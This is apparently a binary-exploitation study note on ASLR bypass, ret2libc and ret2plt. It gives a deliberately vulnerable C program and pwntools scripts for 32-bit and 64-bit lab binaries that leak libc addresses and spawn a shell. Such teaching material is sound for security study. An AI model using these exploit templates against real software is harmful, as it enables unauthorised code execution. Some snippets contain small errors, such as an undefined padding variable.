# ASLR Bypass
## Overview
Bypassing ASLR using a leaked address (e.g., system function) allows an attacker to calculate the base address of libc and exploit a buffer overflow vulnerability. This method works even if NX is enabled, as it uses return-to-libc instead of injecting shellcode.

#### Source Code
````c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buffer[20];
    printf("System is at: %lp\n", system);
    gets(buffer);
}

int main() {
    vuln();
    return 0;
}
````

#### Exploitation Steps
Leak the address of system.
Calculate libc base address from the leak.
Craft a payload to call system("/bin/sh").

#### 32-bit Exploit
```python
from pwn import *

elf = ELF('./vuln-32')
libc = elf.libc
p = process()

# Leak system address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

# Calculate libc base
libc.address = system_leak - libc.sym['system']

# Payload to call system("/bin/sh")
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)
p.interactive()
```

#### 64-bit Exploit
```python
from pwn import *

elf = ELF('./vuln-64')
libc = elf.libc
p = process()

# Leak system address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

# Calculate libc base
libc.address = system_leak - libc.sym['system']

# ROP to call system("/bin/sh")
rop = ROP(libc)
rop.raw('A' * 32)
rop.system(next(libc.search(b'/bin/sh')))

p.sendline(rop.chain())
p.interactive()
```

---

#### Key Notes
Leak system address to bypass ASLR.
Return-to-libc avoids injecting shellcode.
Works on both 32-bit and 64-bit systems.

### **ret2plt**

#### **Overview**
**ret2plt** (Return-to-Procedure Linkage Table) is a technique where an attacker exploits a buffer overflow to redirect the programâ€™s control flow to the **PLT** (Procedure Linkage Table), typically to call functions like `puts`. The attacker passes the **GOT** (Global Offset Table) entry for a function like `puts` to leak its address, then uses that address to perform further exploitation (e.g., **ret2libc**).

#### **Exploitation Steps**
1. Overflow the buffer to control the return address.
2. Call `puts` via the **PLT** and pass the **GOT** entry for `puts` to leak its address.
3. Return to `main` to continue the process and exploit further.

#### **32-bit Exploit**
```python
from pwn import *

elf = ELF('./vuln-32')
p = process()

# Craft payload to call puts@plt with puts@got
payload = flat(
    b'A' * padding,             # Overflow buffer
    elf.plt['puts'],            # Address of puts in PLT
    elf.symbols['main'],        # Return to main
    elf.got['puts']             # Address of puts in GOT
)

p.sendline(payload)
p.interactive()
```

#### **64-bit Exploit**
```python
from pwn import *

elf = ELF('./vuln-64')
p = process()

# Define ROP gadget for RDI register (for 64-bit)
POP_RDI = 0x4011cb  # Example POP RDI gadget address

# Craft payload to call puts@plt with puts@got
payload = flat(
    b'A' * padding,             # Overflow buffer
    POP_RDI,                    # Gadget to set RDI
    elf.got['puts'],            # Address of puts in GOT
    elf.plt['puts'],            # Address of puts in PLT
    elf.symbols['main']         # Return to main
)

p.sendline(payload)
p.interactive()
```

#### **Key Notes**
- **ret2plt** leaks the address of functions (like `puts`) to bypass ASLR.
- It involves using **GOT** entries and **PLT** to perform controlled function calls.
- This can lead to **ret2libc** exploitation once the leaked address is known.

